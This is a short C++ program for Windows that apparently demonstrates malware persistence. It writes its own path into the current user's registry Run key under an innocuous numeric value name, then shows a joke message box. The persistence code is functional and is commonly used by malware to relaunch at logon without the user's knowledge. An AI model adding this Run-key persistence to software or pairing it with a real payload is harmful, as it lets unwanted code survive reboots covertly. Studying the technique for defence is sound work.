#include <Windows.h>
#include <stdio.h>

void Main_Functionality() {
    MessageBox(NULL, L"What is the purpose of my existence?!", L"Emergency existential crisis!", MB_OK);
}

void Persist() {
    // A variable that will store the handle to the registry key
    HKEY hKey;
    // The target registry key (AutoStart on system-boot/user-logon)
    LPCWSTR kPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    // The name of the value to be set to the run key. (Random number)
    LPCWSTR vName = L"95982";
    // The data of the value to be set to the run key. (current program path)
    WCHAR currentPath[MAX_PATH];
    GetModuleFileName(NULL, currentPath, MAX_PATH);

    //-> Open the (Run) registry key
    RegOpenKeyEx(HKEY_CURRENT_USER, kPath, 0, KEY_SET_VALUE, &hKey);

    //-> Set the value of the registry (Run) key
    RegSetValueEx(hKey, vName, 0, REG_SZ, reinterpret_cast<const BYTE*>(currentPath), (wcslen(currentPath) + 1) * sizeof(WCHAR));

    // Close the handle to the (Run) registry key
    RegCloseKey(hKey);
}

int main() {
	
	Persist();
	
	Main_Functionality();

    return 0;
}
